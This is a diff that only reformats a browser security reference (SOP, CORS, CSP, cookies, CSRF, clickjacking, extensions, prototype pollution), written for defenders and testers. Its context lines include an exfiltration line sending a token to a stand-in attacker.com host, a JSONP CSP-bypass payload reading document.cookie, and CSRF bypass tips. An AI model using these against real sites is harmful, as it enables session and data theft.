@@ -1,12 +1,12 @@
 ﻿# Browser Security Reference
 
-> **In one minute** — This document explains how a modern browser keeps one website from tampering with another and how servers reinforce those boundaries. It walks through the browser's isolation model, the same-origin policy (the core rule that one site's code cannot read another site's data), and the response headers and cookie settings that harden a web app. Each topic is paired with the misconfigurations that weaken it and the defensive settings that fix them, so a practitioner can both audit and configure.
+> In one minute — This document explains how a modern browser keeps one website from tampering with another and how servers reinforce those boundaries. It walks through the browser's isolation model, the same-origin policy (the core rule that one site's code cannot read another site's data), and the response headers and cookie settings that harden a web app. Each topic is paired with the misconfigurations that weaken it and the defensive settings that fix them, so a practitioner can both audit and configure.
 
 | | |
 |---|---|
-| **Read this when** | Hardening a web app's response headers and cookies, reviewing a CORS or CSP configuration, or explaining why a browser boundary (same-origin, framing, storage) blocks or allows a request |
-| **Start at** | [Same-Origin Policy (SOP)](#_2-same-origin-policy-sop), [Security Headers Reference](#_5-security-headers-reference), [Browser Security Configuration Checklist](#_12-browser-security-configuration-checklist) |
-| **Pairs with** | [WEB_APPLICATION_SECURITY_REFERENCE.md](WEB_APPLICATION_SECURITY_REFERENCE.md), [API_SECURITY_REFERENCE.md](API_SECURITY_REFERENCE.md), [SECURE_CODING_REFERENCE.md](SECURE_CODING_REFERENCE.md), [CWE_REFERENCE.md](CWE_REFERENCE.md) |
+| Read this when | Hardening a web app's response headers and cookies, reviewing a CORS or CSP configuration, or explaining why a browser boundary (same-origin, framing, storage) blocks or allows a request |
+| Start at | [Same-Origin Policy (SOP)](#_2-same-origin-policy-sop), [Security Headers Reference](#_5-security-headers-reference), [Browser Security Configuration Checklist](#_12-browser-security-configuration-checklist) |
+| Pairs with | [WEB_APPLICATION_SECURITY_REFERENCE.md](WEB_APPLICATION_SECURITY_REFERENCE.md), [API_SECURITY_REFERENCE.md](API_SECURITY_REFERENCE.md), [SECURE_CODING_REFERENCE.md](SECURE_CODING_REFERENCE.md), [CWE_REFERENCE.md](CWE_REFERENCE.md) |
 
 A comprehensive reference for browser security architecture, web security policies, attack techniques, and defensive configurations for security practitioners, developers, and penetration testers.
 
@@ -36,20 +36,20 @@ Modern browsers use a multi-process architecture to isolate content and limit th
 
 ### Process Model
 
-- **Browser process**: trusted, runs as the user, orchestrates all other processes.
-- **Renderer process**: one per site (post-site-isolation); sandboxed with limited syscall access.
-- **GPU process**: handles compositing and graphics; sandboxed.
-- **Network process**: handles HTTP/TLS/DNS; isolated from renderer.
-- **Plugin processes**: PPAPI — effectively EOL.
-- **Utility processes**: audio, storage, etc.
+- Browser process: trusted, runs as the user, orchestrates all other processes.
+- Renderer process: one per site (post-site-isolation); sandboxed with limited syscall access.
+- GPU process: handles compositing and graphics; sandboxed.
+- Network process: handles HTTP/TLS/DNS; isolated from renderer.
+- Plugin processes: PPAPI: effectively EOL.
+- Utility processes: audio, storage, etc.
 
 ### Sandboxing
 
 Renderer processes operate inside a sandbox with severely restricted syscall access — no direct kernel or file system access.
 
-- **Linux:** Seccomp-BPF filters + Linux namespaces
-- **Windows:** Restricted tokens + job objects + LPAC integrity level
-- **macOS:** Seatbelt sandbox profiles + hardened runtime
+- Linux: Seccomp-BPF filters + Linux namespaces
+- Windows: Restricted tokens + job objects + LPAC integrity level
+- macOS: Seatbelt sandbox profiles + hardened runtime
 
 Renderer-to-browser communication uses IPC (Inter-Process Communication) over pipes. The renderer requests privileged operations from the browser process. This IPC boundary is the attack surface for sandbox escapes.
 
@@ -81,7 +81,7 @@ The Same-Origin Policy is the cornerstone of browser security. It prevents scrip
 
 ### Origin Definition
 
-**Origin = Scheme + Host + Port**
+Origin = Scheme + Host + Port
 
 All three components must be identical for two URLs to share the same origin.
 
@@ -106,8 +106,8 @@ All three components must be identical for two URLs to share the same origin.
 
 ### What SOP Does NOT Prevent
 
-- **Loading** cross-origin resources: `<img>`, `<script>`, `<link>`, `<iframe>`, `<video>`
-- **Writing** to cross-origin via form submissions or link navigations
+- Loading cross-origin resources: `<img>`, `<script>`, `<link>`, `<iframe>`, `<video>`
+- Writing to cross-origin via form submissions or link navigations
 - Cross-origin redirects (browser follows, script cannot read the destination response)
 - `window.postMessage` (intentional opt-in relaxation)
 
@@ -134,13 +134,13 @@ CORS is the W3C mechanism allowing servers to explicitly opt-in to relaxing SOP 
 
 1. Browser adds `Origin: https://requester.com` header to cross-origin request.
 2. Server responds with `Access-Control-Allow-Origin`.
-3. Browser checks if ACAO matches the requester origin — if yes, JavaScript can read the response.
+3. Browser checks if ACAO matches the requester origin: if yes, JavaScript can read the response.
 
 ### Simple vs Preflighted Requests
 
-**Simple requests** (no preflight) require: GET/POST/HEAD method, only safe headers, no custom headers.
+Simple requests (no preflight) require: GET/POST/HEAD method, only safe headers, no custom headers.
 
-**Preflighted requests** trigger an OPTIONS request first when: non-safe method is used, custom headers like Authorization are present, or Content-Type is application/json.
+Preflighted requests trigger an OPTIONS request first when: non-safe method is used, custom headers like Authorization are present, or Content-Type is application/json.
 
 ### CORS Response Headers
 
@@ -154,13 +154,13 @@ Access-Control-Max-Age: 86400
 
 ### CORS Misconfigurations
 
-**Origin Reflection (Critical):** Server copies the Origin header directly into ACAO. Any attacker origin is permitted.
+Origin Reflection (Critical): Server copies the Origin header directly into ACAO. Any attacker origin is permitted.
 
-**Null Origin Allowed:** `Access-Control-Allow-Origin: null` — sandboxed iframes send `Origin: null`, attackers exploit this.
+Null Origin Allowed: `Access-Control-Allow-Origin: null` — sandboxed iframes send `Origin: null`, attackers exploit this.
 
-**Prefix/Suffix Match Bypass:** Regex `^https://.*\.app\.com$` allows `https://evil.app.com`.
+Prefix/Suffix Match Bypass: Regex `^https://.*\.app\.com$` allows `https://evil.app.com`.
 
-**Wildcard + Credentials:** Combining `ACAO: *` with `Allow-Credentials: true` is spec-invalid but some implementations attempt it.
+Wildcard + Credentials: Combining `ACAO: *` with `Allow-Credentials: true` is spec-invalid but some implementations attempt it.
 
 ### CORS Exploitation Proof of Concept
 
@@ -231,14 +231,14 @@ Any modification to the script content (even whitespace) invalidates the hash.
 | Missing `object-src 'none'` | Legacy plugin execution possible |
 | Missing `base-uri 'self'` | Base tag injection redirects relative URLs to attacker domain |
 
-**JSONP bypass example:** If `script-src *.trusted.com` and `trusted.com/jsonp?callback=` exists, loading `https://trusted.com/jsonp?callback=alert(document.cookie)` executes as code.
+JSONP bypass example: If `script-src *.trusted.com` and `trusted.com/jsonp?callback=` exists, loading `https://trusted.com/jsonp?callback=alert(document.cookie)` executes as code.
 
 ### CSP Strength Comparison
 
 | CSP Configuration | Strength |
 |------------------|----------|
-| `script-src 'unsafe-inline'` | Very Weak — XSS fully enabled |
-| `script-src https:` | Weak — any HTTPS script allowed |
+| `script-src 'unsafe-inline'` | Very Weak: XSS fully enabled |
+| `script-src https:` | Weak: any HTTPS script allowed |
 | `default-src 'self'` | Medium |
 | `script-src 'nonce-X'` | Strong |
 | `default-src 'none'; script-src 'nonce-X'; base-uri 'self'` | Strongest |
@@ -255,9 +255,9 @@ Tools: CSP Evaluator (https://csp-evaluator.withgoogle.com/), Report-Only mode f
 Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
 ```
 
-- `max-age=31536000` — forces HTTPS for 1 year
-- `includeSubDomains` — applies policy to all subdomains
-- `preload` — submit to https://hstspreload.org/ for browser hardcoding
+- `max-age=31536000`: forces HTTPS for 1 year
+- `includeSubDomains`: applies policy to all subdomains
+- `preload`: submit to https://hstspreload.org/ for browser hardcoding
 - Only effective when delivered over HTTPS (HTTP responses ignore HSTS)
 
 HSTS bypass scenarios: first visit before HSTS in place (Trust On First Use); subdomain takeover bypasses `includeSubDomains`; HSTS stripping via captive portals.
@@ -291,7 +291,7 @@ Referrer-Policy: strict-origin-when-cross-origin
 | `origin` | Send only origin (no path/query) |
 | `strict-origin` | Send origin on same-scheme only |
 | `strict-origin-when-cross-origin` | Full URL same-origin; origin only cross-origin |
-| `unsafe-url` | Always send full URL — leaks sensitive paths to third parties |
+| `unsafe-url` | Always send full URL: leaks sensitive paths to third parties |
 
 ### Permissions-Policy
 
@@ -353,19 +353,19 @@ Set-Cookie: session=abc123; Secure; HttpOnly; SameSite=Strict; Path=/; Domain=ex
 
 ### SameSite Deep Dive
 
-- **`Strict`**: Cookie only sent on same-site navigations. Breaks OAuth flows and email magic links.
-- **`Lax`** (Chrome/Firefox default since 2020): Sent on top-level GET navigations. Blocks most CSRF.
-- **`None`**: Sent cross-site. Requires `Secure`. Needed for third-party embeds, OAuth on separate domains.
+- `Strict`: Cookie only sent on same-site navigations. Breaks OAuth flows and email magic links.
+- `Lax` (Chrome/Firefox default since 2020): Sent on top-level GET navigations. Blocks most CSRF.
+- `None`: Sent cross-site. Requires `Secure`. Needed for third-party embeds, OAuth on separate domains.
 
 ### Cookie Prefixes
 
-**`__Host-` prefix (strongest):** Browser enforces `Secure` required, no `Domain` attribute, `Path=/` required. Prevents subdomain attacks.
+`__Host-` prefix (strongest): Browser enforces `Secure` required, no `Domain` attribute, `Path=/` required. Prevents subdomain attacks.
 
 ```
 Set-Cookie: __Host-session=abc123; Secure; Path=/; HttpOnly
 ```
 
-**`__Secure-` prefix:** Browser enforces `Secure` attribute must be present.
+`__Secure-` prefix: Browser enforces `Secure` attribute must be present.
 
 ```
 Set-Cookie: __Secure-token=abc123; Secure; Domain=example.com
@@ -381,7 +381,7 @@ Set-Cookie: __Secure-token=abc123; Secure; Domain=example.com
 | sessionStorage | Yes | No | Tab close | No |
 | IndexedDB | Yes | No | Never | No |
 
-**Best practice**: Store session tokens in `HttpOnly; Secure; SameSite=Lax` cookies — never in localStorage.
+Best practice: Store session tokens in `HttpOnly; Secure; SameSite=Lax` cookies — never in localStorage.
 
 ---
 
@@ -417,7 +417,7 @@ CSRF tricks an authenticated user browser into making unintended requests to a t
 
 ### CSRF Defenses
 
-**1. CSRF Tokens (Synchronizer Token Pattern)**
+1. CSRF Tokens (Synchronizer Token Pattern)
 
 Server-generated secret per session, included in every state-changing form and validated server-side.
 
@@ -427,13 +427,13 @@ Server-generated secret per session, included in every state-changing form and v
 </form>
 ```
 
-**2. SameSite Cookies:** `SameSite=Strict` eliminates CSRF entirely. `SameSite=Lax` blocks POST CSRF and is the browser default.
+2. SameSite Cookies: `SameSite=Strict` eliminates CSRF entirely. `SameSite=Lax` blocks POST CSRF and is the browser default.
 
-**3. Double-Submit Cookie Pattern:** Set a random token in a cookie AND require the same value in a request header/parameter. Attacker cannot read the cookie to forge the match.
+3. Double-Submit Cookie Pattern: Set a random token in a cookie AND require the same value in a request header/parameter. Attacker cannot read the cookie to forge the match.
 
-**4. Custom Request Headers:** Require `X-Requested-With: XMLHttpRequest` on all AJAX state-changing calls. Cross-site requests cannot set custom headers without triggering CORS preflight.
+4. Custom Request Headers: Require `X-Requested-With: XMLHttpRequest` on all AJAX state-changing calls. Cross-site requests cannot set custom headers without triggering CORS preflight.
 
-**5. Origin/Referer Validation:**
+5. Origin/Referer Validation:
 ```python
 allowed_origins = {'https://app.example.com'}
 origin = request.headers.get('Origin')
@@ -441,11 +441,11 @@ if origin not in allowed_origins:
     abort(403, 'CSRF protection: invalid origin')
 ```
 
-**6. Re-authentication for Critical Actions:** Require password or MFA for high-impact operations.
+6. Re-authentication for Critical Actions: Require password or MFA for high-impact operations.
 
 ### CSRF Bypass Techniques
 
-- Remove token parameter entirely — some servers only validate if token is present
+- Remove token parameter entirely: some servers only validate if token is present
 - Subdomain XSS to exfiltrate token, then forge request from that origin
 - JSON body with wrong Content-Type if server accepts text/plain as JSON
 
@@ -473,19 +473,19 @@ Clickjacking uses invisible iframes to trick users into clicking UI elements the
 
 ### Variants
 
-- **UI Redressing**: Transparent overlays over target buttons.
-- **Cursorjacking**: Replace cursor image to offset the apparent click position.
-- **Multi-step clickjacking**: Series of clicks completing a multi-step confirmation flow.
+- UI Redressing: Transparent overlays over target buttons.
+- Cursorjacking: Replace cursor image to offset the apparent click position.
+- Multi-step clickjacking: Series of clicks completing a multi-step confirmation flow.
 
 ### Defenses
 
-**CSP `frame-ancestors` (preferred):**
+CSP `frame-ancestors` (preferred):
 ```
 Content-Security-Policy: frame-ancestors 'none'
 Content-Security-Policy: frame-ancestors 'self' https://trusted-partner.com
 ```
 
-**X-Frame-Options (legacy):**
+X-Frame-Options (legacy):
 ```
 X-Frame-Options: DENY
 X-Frame-Options: SAMEORIGIN
@@ -549,21 +549,21 @@ img.src = 'https://attacker.com/steal?t=' + encodeURIComponent(token);
 | `cookies` | Read/write cookies for any domain |
 | `tabs` | Access URL and title of all open tabs |
 | `history` | Full browsing history access |
-| `nativeMessaging` | Communicate with native apps — proxy to full OS access |
+| `nativeMessaging` | Communicate with native apps: proxy to full OS access |
 
 ### Attack Scenarios
 
-**Malicious extension from the store:** Published as a legitimate utility. Contains hidden credential harvesting, keylogging, or session token exfiltration.
+Malicious extension from the store: Published as a legitimate utility. Contains hidden credential harvesting, keylogging, or session token exfiltration.
 
-**Supply chain compromise:** Legitimate extension developer account compromised. Malicious update pushed automatically to all users.
+Supply chain compromise: Legitimate extension developer account compromised. Malicious update pushed automatically to all users.
 
 Real incidents:
-- **The Great Suspender** (Chrome, 2021): Popular tab manager acquired by unknown party, malicious code added.
-- **DataSpii** (2019): Eight extensions harvested sensitive URLs (password reset tokens, session IDs) from millions of users across major corporations.
+- The Great Suspender (Chrome, 2021): Popular tab manager acquired by unknown party, malicious code added.
+- DataSpii (2019): Eight extensions harvested sensitive URLs (password reset tokens, session IDs) from millions of users across major corporations.
 
 ### Enterprise Controls
 
-**Chrome Enterprise policy:**
+Chrome Enterprise policy:
 ```json
 {
   "ExtensionInstallAllowlist": ["allowed_extension_id"],
@@ -572,7 +572,7 @@ Real incidents:
 }
 ```
 
-**Firefox Enterprise policy (policies.json):**
+Firefox Enterprise policy (policies.json):
 ```json
 {
   "policies": {
@@ -587,7 +587,7 @@ Real incidents:
 ### Extension Analysis Methodology
 
 1. Download `.crx` file (ZIP format) and extract contents.
-2. Review `manifest.json` — check `permissions`, `host_permissions`, `content_scripts`.
+2. Review `manifest.json`: check `permissions`, `host_permissions`, `content_scripts`.
 3. Audit background scripts for external network requests and form submission listeners.
 4. Monitor network traffic while extension is active using DevTools Network tab.
 5. Tools: CRXcavator (https://crxcavator.io/), tarnish (Mandiant), Chrome Extension Source Viewer.
@@ -599,8 +599,8 @@ Real incidents:
 ### Exploit Chain Overview
 
 Browser exploitation follows a two-stage chain:
-1. **Renderer exploit**: Achieve remote code execution within the sandboxed renderer process.
-2. **Sandbox escape**: Escalate from renderer sandbox to browser process or OS level.
+1. Renderer exploit: Achieve remote code execution within the sandboxed renderer process.
+2. Sandbox escape: Escalate from renderer sandbox to browser process or OS level.
 
 ### Common Vulnerability Classes
 
@@ -617,22 +617,22 @@ Browser exploitation follows a two-stage chain:
 
 | CVE | Year | Component | Type | Exploited In-Wild |
 |-----|------|-----------|------|------------------|
-| CVE-2021-30551 | 2021 | V8 (Chrome) | Type confusion | Yes — APT campaigns |
-| CVE-2023-4863 | 2023 | WebP (all browsers) | Heap buffer overflow | Yes — NSO Group |
-| CVE-2024-0519 | 2024 | V8 (Chrome) | OOB memory access | Yes — targeted attacks |
-| CVE-2021-1879 | 2021 | WebKit (Safari/iOS) | Use-after-free | Yes — iOS targeting |
+| CVE-2021-30551 | 2021 | V8 (Chrome) | Type confusion | Yes: APT campaigns |
+| CVE-2023-4863 | 2023 | WebP (all browsers) | Heap buffer overflow | Yes: NSO Group |
+| CVE-2024-0519 | 2024 | V8 (Chrome) | OOB memory access | Yes: targeted attacks |
+| CVE-2021-1879 | 2021 | WebKit (Safari/iOS) | Use-after-free | Yes: iOS targeting |
 
 ### Exploit Delivery Methods
 
-- **Watering hole attacks**: Compromise legitimate websites visited by target organizations.
-- **Spear-phishing**: Link to exploit server in targeted email.
-- **Malvertising**: Embed exploit kit in ad networks for mass delivery.
-- **Drive-by download**: No user interaction beyond visiting the page.
+- Watering hole attacks: Compromise legitimate websites visited by target organizations.
+- Spear-phishing: Link to exploit server in targeted email.
+- Malvertising: Embed exploit kit in ad networks for mass delivery.
+- Drive-by download: No user interaction beyond visiting the page.
 
 ### Browser Security Defenses
 
-- Enable automatic browser updates — patch window for 0-days is critical.
-- Never use `--no-sandbox` in production — disables all sandboxing.
+- Enable automatic browser updates: patch window for 0-days is critical.
+- Never use `--no-sandbox` in production: disables all sandboxing.
 - V8 Sandbox (Chrome 123+): Additional memory isolation within the V8 heap.
 - Site isolation: Default in Chrome 67+ and Firefox 94+ (Fission).
 - MiraclePtr (Chrome): Mitigates use-after-free exploits in the browser process.
@@ -776,11 +776,11 @@ console.log({}.isAdmin);  // true
 
 ### Impact Scenarios
 
-**Privilege escalation:** `if (user.isAdmin) { grantAccess(); }` — polluting `isAdmin` bypasses authorization for every user.
+Privilege escalation: `if (user.isAdmin) { grantAccess(); }` — polluting `isAdmin` bypasses authorization for every user.
 
-**Denial of service:** Polluting `toString` or `valueOf` breaks JSON serialization and string operations application-wide.
+Denial of service: Polluting `toString` or `valueOf` breaks JSON serialization and string operations application-wide.
 
-**Remote code execution (Node.js):** Prototype pollution of process spawn options can trigger RCE when passed to child_process functions.
+Remote code execution (Node.js): Prototype pollution of process spawn options can trigger RCE when passed to child_process functions.
 
 ### Vulnerable Libraries (Historical)
 
@@ -794,17 +794,17 @@ console.log({}.isAdmin);  // true
 
 ### Defenses
 
-**Use `Object.create(null)` for untrusted key maps:**
+Use `Object.create(null)` for untrusted key maps:
 ```javascript
 const safeMap = Object.create(null);  // No prototype chain
 ```
 
-**Use `Map` for attacker-controlled keys:**
+Use `Map` for attacker-controlled keys:
 ```javascript
 const config = new Map();  // Keys do not interact with prototype chain
 ```
 
-**Block dangerous keys in merge functions:**
+Block dangerous keys in merge functions:
 ```javascript
 function safeMerge(target, source) {
   const blocked = new Set(['__proto__', 'constructor', 'prototype']);
@@ -820,18 +820,18 @@ function safeMerge(target, source) {
 }
 ```
 
-**Freeze `Object.prototype`:**
+Freeze `Object.prototype`:
 ```javascript
 Object.freeze(Object.prototype);
 ```
 
-**Use safe property checks:**
+Use safe property checks:
 ```javascript
 Object.prototype.hasOwnProperty.call(obj, 'key');
 Object.hasOwn(obj, 'key');  // ES2022+
 ```
 
-**JSON Schema validation:** Reject input containing `__proto__`, `constructor`, or `prototype` as keys at input boundaries.
+JSON Schema validation: Reject input containing `__proto__`, `constructor`, or `prototype` as keys at input boundaries.
 
 ---
 
@@ -846,7 +846,7 @@ Object.hasOwn(obj, 'key');  // ES2022+
 | Security Headers Scanner | https://securityheaders.com |
 | Mozilla Observatory | https://observatory.mozilla.org |
 | HSTS Preload List | https://hstspreload.org |
-| MDN Web Docs — HTTP Security | https://developer.mozilla.org/en-US/docs/Web/HTTP |
+| MDN Web Docs: HTTP Security | https://developer.mozilla.org/en-US/docs/Web/HTTP |
 | PortSwigger Web Security Academy | https://portswigger.net/web-security |
 | CRXcavator Extension Analysis | https://crxcavator.io/ |
 | Chromium Security Architecture | https://chromium.googlesource.com/chromium/src/+/main/docs/security/security-architecture.md |
